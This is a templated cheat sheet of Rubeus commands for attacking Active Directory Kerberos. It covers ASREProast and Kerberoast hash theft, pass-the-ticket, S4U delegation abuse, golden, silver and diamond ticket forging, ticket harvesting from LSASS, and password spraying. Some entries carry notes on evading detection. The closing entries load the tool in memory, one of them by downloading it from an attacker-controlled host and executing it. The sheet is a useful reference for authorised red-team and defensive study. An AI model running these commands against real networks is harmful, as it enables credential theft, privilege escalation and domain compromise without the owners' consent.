# Rubeus
> .NET Kerberos abuse toolkit: ASREProast, Kerberoast, ticket forging (golden/silver/diamond), S4U delegation, PtT, and ticket harvesting.

<!-- tags: ad,rubeus,kerberos,ticket,kerberoast,asreproast,delegation,exploit -->

---

## asreproast one user to file
ASREPRoast a single user and save the AS-REP hash to disk for offline cracking.

```bash
.\Rubeus.exe asreproast /user:{{TARGET_USER:str}} /domain:{{DOMAIN:domain}} /dc:{{RHOST_NAME:str:dc01.corp.local}} /nowrap /outfile:{{OUTFILE:file:hashes.txt}}
```

<!-- meta: risk=med | phase=exploit | tags=asreproast,roast,offline -->

---

## asreproast hashcat format
Same single-user ASREPRoast but emit the hash already in hashcat 18200 format.

```bash
.\Rubeus.exe asreproast /user:{{TARGET_USER:str}} /nowrap /format:hashcat
```

<!-- meta: risk=med | phase=exploit | tags=asreproast,hashcat,18200 -->

---

## kerberoast stats only
Print Kerberoast stats only (account counts, encryption types) without requesting tickets. Quick scope check.

```bash
.\Rubeus.exe kerberoast /stats
```

<!-- meta: risk=low | phase=recon | tags=kerberoast,stats,scope -->

---

## kerberoast admincount=1
Restrict roast to AdminSDHolder-protected accounts. Highest-value targets only.

```bash
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

<!-- meta: risk=med | phase=exploit | tags=kerberoast,admincount,adminsdholder -->

---

## kerberoast one user
Targeted Kerberoast against a named user.

```bash
.\Rubeus.exe kerberoast /user:{{TARGET_USER:str}} /nowrap
```

<!-- meta: risk=med | phase=exploit | tags=kerberoast,targeted -->

---

## kerberoast all spns
Bulk Kerberoast every SPN-enabled account in the domain.

```bash
.\Rubeus.exe kerberoast /nowrap
```

<!-- meta: risk=med | phase=exploit | tags=kerberoast,bulk,spn -->

---

## kerberoast no preauth
Roast a target via the no-preauth path (DONT_REQ_PREAUTH set). Works without valid creds, given the target's SPN.

```bash
.\Rubeus.exe kerberoast /nopreauth:{{TARGET_USER:str}} /domain:{{DOMAIN:domain}} /spn:{{SPN:str:MSSQLSvc/db01.corp.local}} /nowrap
```

<!-- meta: risk=med | phase=exploit | tags=kerberoast,nopreauth,nocreds -->

---

## kerberoast rc4 only opsec
Skip AES-enabled accounts to avoid the 4769 AES Kerberoasting flag raised in modern hunts.

```bash
.\Rubeus.exe kerberoast /rc4opsec /outfile:{{OUTFILE:file:hashes.txt}}
```

<!-- meta: risk=med | phase=exploit | tags=kerberoast,rc4,opsec -->

---

## kerberoast aes only
Target AES-enabled accounts specifically. Slower to crack but bypasses weak rules that only watch RC4.

```bash
.\Rubeus.exe kerberoast /aes /outfile:{{OUTFILE:file:hashes.txt}}
```

<!-- meta: risk=med | phase=exploit | tags=kerberoast,aes,opsec -->

---

## kerberoast simple output
Targeted roast in /simple output format - just the hash, no surrounding metadata.

```bash
.\Rubeus.exe kerberoast /user:{{TARGET_USER:str}} /simple /outfile:{{OUTFILE:file:hashes.txt}}
```

<!-- meta: risk=med | phase=exploit | tags=kerberoast,simple,output -->

---

## asktgt from rc4 ptt
Request a TGT using the user's RC4 (NT) hash and inject it into the current session in one step.

```bash
.\Rubeus.exe asktgt /rc4:{{NTHASH:str}} /user:{{USERNAME:str}} /ptt
```

<!-- meta: risk=high | phase=exploit | tags=asktgt,opth,ptt -->

---

## asktgt from password
Request a TGT with a cleartext password, output .kirbi (no PTT). Useful when the ticket is consumed elsewhere.

```bash
.\Rubeus.exe asktgt /user:{{USERNAME:str}} /password:{{PASSWORD:str}} /domain:{{DOMAIN:domain}} /dc:{{RHOST_NAME:str:dc01.corp.local}} /nowrap
```

<!-- meta: risk=med | phase=exploit | tags=asktgt,password,kirbi -->

---

## asktgt via pkinit cert
PKINIT TGT request using a certificate (PFX) and its password. /getcredentials returns the user's NT hash.

```bash
.\Rubeus.exe asktgt /user:{{USERNAME:str}} /certificate:{{PFX:file:user.pfx}} /password:"{{PASSWORD:str}}" /domain:{{DOMAIN:domain}} /dc:{{RHOST_NAME:str:dc01.corp.local}} /getcredentials /show /nowrap
```

<!-- meta: risk=high | phase=exploit | tags=asktgt,pkinit,certificate,getcredentials -->

---

## asktgt with aes256 key
Request a TGT with an AES256 key instead of RC4. Prefer this to avoid RC4 downgrade telemetry.

```bash
.\Rubeus.exe asktgt /user:{{USERNAME:str}} /aes256:{{AESKEY:str}} /domain:{{DOMAIN:domain}} /dc:{{RHOST_NAME:str:dc01.corp.local}} /nowrap
```

<!-- meta: risk=high | phase=exploit | tags=asktgt,aes256,opsec -->

---

## asktgt into netonly process
Create a sacrificial net-only process and apply the TGT there so the current logon session's tickets are not clobbered.

```bash
.\Rubeus.exe asktgt /user:{{USERNAME:str}} /aes256:{{AESKEY:str}} /domain:{{DOMAIN:domain}} /createnetonly:C:\Windows\System32\cmd.exe /show
```

<!-- meta: risk=high | phase=exploit | tags=asktgt,netonly,sacrificial -->

---

## s4u2self impersonate user
S4U2Self with /altservice to forge a usable service ticket as another user, then PTT.

```bash
.\Rubeus.exe s4u /self /nowrap /impersonateuser:{{TARGET_USER:str}} /altservice:{{SPN:str:cifs/web01.corp.local}} /ptt /ticket:{{TICKET:file:ticket.kirbi}}
```

<!-- meta: risk=high | phase=exploit | tags=s4u,s4u2self,impersonate,ptt -->

---

## s4u2proxy as administrator
S4U2Proxy chain to forge a service ticket as administrator on the named SPN, using a controlled account's RC4 hash.

```bash
.\Rubeus.exe s4u /impersonateuser:administrator /msdsspn:{{SPN:str:cifs/web01.corp.local}} /altservice:{{ALTSERVICE:str:host}} /user:{{USERNAME:str}} /rc4:{{NTHASH:str}} /ptt
```

<!-- meta: risk=critical | phase=exploit | tags=s4u,s4u2proxy,delegation,admin -->

---

## s4u2proxy rbcd self
S4U2Proxy where the impersonated user is the same controlled user; useful in RBCD chains.

```bash
.\Rubeus.exe s4u /user:{{USERNAME:str}} /rc4:{{NTHASH:str}} /impersonateuser:{{USERNAME:str}} /msdsspn:{{SPN:str:cifs/web01.corp.local}} /ptt
```

<!-- meta: risk=critical | phase=exploit | tags=s4u,s4u2proxy,rbcd -->

---

## createnetonly cmd
Spawn cmd.exe under a net-only sacrificial logon. Lets you load tickets into a clean LUID without touching the host token.

```bash
.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

<!-- meta: risk=med | phase=exploit | tags=createnetonly,sacrificial,luid -->

---

## ptt inject kirbi file
Inject a .kirbi ticket file into the current logon session.

```bash
.\Rubeus.exe ptt /ticket:{{TICKET:file:ticket.kirbi}}
```

<!-- meta: risk=high | phase=exploit | tags=ptt,kirbi,inject -->

---

## ptt inject base64 ticket
Inject a base64-encoded ticket into the current session. Avoids dropping a file on disk.

```bash
.\Rubeus.exe ptt /ticket:{{TICKET:str}}
```

<!-- meta: risk=high | phase=exploit | tags=ptt,base64,inject -->

---

## describe ticket
Parse a .kirbi or base64 ticket and show ticket metadata.

```bash
.\Rubeus.exe describe /ticket:{{TICKET:file:ticket.kirbi}} /nowrap
```

<!-- meta: risk=low | phase=misc | tags=describe,ticket,inspect -->

---

## triage tickets in session
List all tickets currently loaded in the session (LUID, target, encryption).

```bash
.\Rubeus.exe triage
```

<!-- meta: risk=low | phase=recon | tags=triage,list,session -->

---

## dump all accessible tickets
Dump Kerberos tickets from all accessible logon sessions.

```bash
.\Rubeus.exe dump
```

<!-- meta: risk=high | phase=post | tags=dump,tickets,harvest -->

---

## golden ticket
Forge a golden TGT with optional extra-SIDs (cross-forest impersonation) and inject it.

```bash
.\Rubeus.exe golden /rc4:{{KRBTGT_HASH:str}} /domain:{{DOMAIN:domain}} /sid:{{SID:str:S-1-5-21-...}} /sids:{{EXTRA_SIDS:str:S-1-5-21-...-519}} /user:{{TARGET_USER:str:Administrator}} /ptt
```

<!-- meta: risk=critical | phase=post | tags=golden,forge,krbtgt -->

---

## golden ticket via ldap
Forge a golden ticket while letting Rubeus pull PAC fields from LDAP, then print a reusable command.

```bash
.\Rubeus.exe golden /aes256:{{AESKEY:str}} /ldap /user:{{TARGET_USER:str:Administrator}} /domain:{{DOMAIN:domain}} /dc:{{RHOST_NAME:str:dc01.corp.local}} /printcmd /ptt
```

<!-- meta: risk=critical | phase=post | tags=golden,ldap,pac -->

---

## silver ticket
Forge a service ticket for a target SPN using the service account key, then inject it.

```bash
.\Rubeus.exe silver /rc4:{{TARGET_NTHASH:str}} /user:{{TARGET_USER:str:Administrator}} /service:{{SPN:str:cifs/web01.corp.local}} /domain:{{DOMAIN:domain}} /sid:{{SID:str:S-1-5-21-...}} /ptt
```

<!-- meta: risk=critical | phase=post | tags=silver,forge,spn -->

---

## diamond ticket from password
Request a real TGT, modify PAC fields, and re-sign it with the krbtgt key. Keeps the normal request pattern while changing the embedded identity.

```bash
.\Rubeus.exe diamond /krbkey:{{KRBTGT_AES:str}} /user:{{USERNAME:str}} /password:{{PASSWORD:str}} /domain:{{DOMAIN:domain}} /dc:{{RHOST_NAME:str:dc01.corp.local}} /ticketuser:{{TARGET_USER:str:Administrator}} /ticketuserid:{{TARGET_RID:int:500}} /groups:{{GROUP_RIDS:str:512,519}} /ptt
```

<!-- meta: risk=critical | phase=post | tags=diamond,forge,krbtgt,pac -->

---

## diamond ticket via tgtdeleg
Use the tgtdeleg trick as the base ticket, then modify PAC fields with the krbtgt key.

```bash
.\Rubeus.exe diamond /krbkey:{{KRBTGT_AES:str}} /tgtdeleg /ticketuser:{{TARGET_USER:str:Administrator}} /ticketuserid:{{TARGET_RID:int:500}} /groups:{{GROUP_RIDS:str:512,519}} /ptt
```

<!-- meta: risk=critical | phase=post | tags=diamond,tgtdeleg,krbtgt -->

---

## monitor for new tgts
Monitor LSASS for new TGTs at a 5s interval. Used after coercing a target to a host you control to grab inbound tickets.

```bash
.\Rubeus.exe monitor /interval:5 /nowrap
```

<!-- meta: risk=high | phase=post | tags=monitor,harvest,unconstrained -->

---

## monitor target user tgts
Monitor for new TGTs belonging to a specific user or machine account.

```bash
.\Rubeus.exe monitor /targetuser:{{TARGET_USER:str}} /interval:{{INTERVAL:int:5}} /runfor:{{RUNFOR:int:600}} /nowrap
```

<!-- meta: risk=high | phase=post | tags=monitor,targetuser,harvest -->

---

## harvest and renew tgts
Maintain a cache of observed TGTs and renew them before expiry. Useful on unconstrained delegation hosts.

```bash
.\Rubeus.exe harvest /monitorinterval:{{MONITOR_INTERVAL:int:60}} /displayinterval:{{DISPLAY_INTERVAL:int:600}} /nowrap
```

<!-- meta: risk=high | phase=post | tags=harvest,renew,unconstrained -->

---

## asktgs for named service
Request a TGS for a named service using an existing TGT and PTT.

```bash
.\Rubeus.exe asktgs /ticket:{{TICKET:file:ticket.kirbi}} /service:{{SPN:str:cifs/web01.corp.local}} /ptt
```

<!-- meta: risk=high | phase=exploit | tags=asktgs,tgs,ptt -->

---

## tgtdeleg current user
Use the GSS-API delegation trick to retrieve a usable TGT for the current user without elevation.

```bash
.\Rubeus.exe tgtdeleg /target:{{SPN:str:cifs/dc01.corp.local}}
```

<!-- meta: risk=med | phase=exploit | tags=tgtdeleg,delegation,nopriv -->

---

## hash password to kerberos keys
Compute Kerberos keys (RC4, AES128, AES256) from a cleartext password for the specified user/domain.

```bash
.\Rubeus.exe hash /password:{{PASSWORD:str}} /user:{{USERNAME:str}} /domain:{{DOMAIN:domain}}
```

<!-- meta: risk=low | phase=misc | tags=hash,keys,aes -->

---

## kerberos password spray
Spray a single password across users via Kerberos. /noticket suppresses successful TGT output.

```bash
.\Rubeus.exe brute /password:{{PASSWORD:str}} /users:{{USERLIST:wordlist:users.txt}} /domain:{{DOMAIN:domain}} /dc:{{RHOST_NAME:str:dc01.corp.local}} /noticket
```

<!-- meta: risk=med | phase=recon | tags=brute,spray,kerberos -->

---

## preauth scan asreproastable
Scan a user list for accounts that do not require Kerberos pre-authentication.

```bash
.\Rubeus.exe preauthscan /users:{{USERLIST:wordlist:users.txt}} /domain:{{DOMAIN:domain}} /dc:{{RHOST_NAME:str:dc01.corp.local}}
```

<!-- meta: risk=low | phase=recon | tags=preauthscan,asreproast,enum -->

---

## change password with ticket
Use an existing TGT or changepw ticket to reset a password through Kerberos.

```bash
.\Rubeus.exe changepw /ticket:{{TICKET:file:ticket.kirbi}} /new:{{NEW_PASSWORD:str}} /dc:{{RHOST_NAME:str:dc01.corp.local}} /targetuser:{{DOMAIN:domain}}\{{TARGET_USER:str}}
```

<!-- meta: risk=high | phase=exploit | tags=changepw,reset,kerberos -->

---

## load rubeus from disk
Load Rubeus into the current PowerShell session via Reflection - no Rubeus.exe process spawn.

```bash
[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("{{RUBEUS_PATH:str:C:\Tools\Rubeus.exe}}"))
```

<!-- meta: risk=med | phase=exploit | tags=inmemory,reflection,load -->

---

## load rubeus from url
Pull Rubeus from an attacker server and load into the current PS session - no disk drop.

```bash
$data = (New-Object System.Net.WebClient).DownloadData('http://{{LHOST:ip}}:{{LPORT:int:8000}}/Rubeus.exe'); [System.Reflection.Assembly]::Load($data)
```

<!-- meta: risk=med | phase=exploit | tags=inmemory,download,reflection -->

---

## invoke loaded rubeus
After loading via Reflection, call into Rubeus.Program directly with split args.

```bash
[Rubeus.Program]::Main("{{RUBEUS_CMD:str:kerberoast /nowrap}}".Split())
```

<!-- meta: risk=med | phase=exploit | tags=inmemory,invoke,program -->
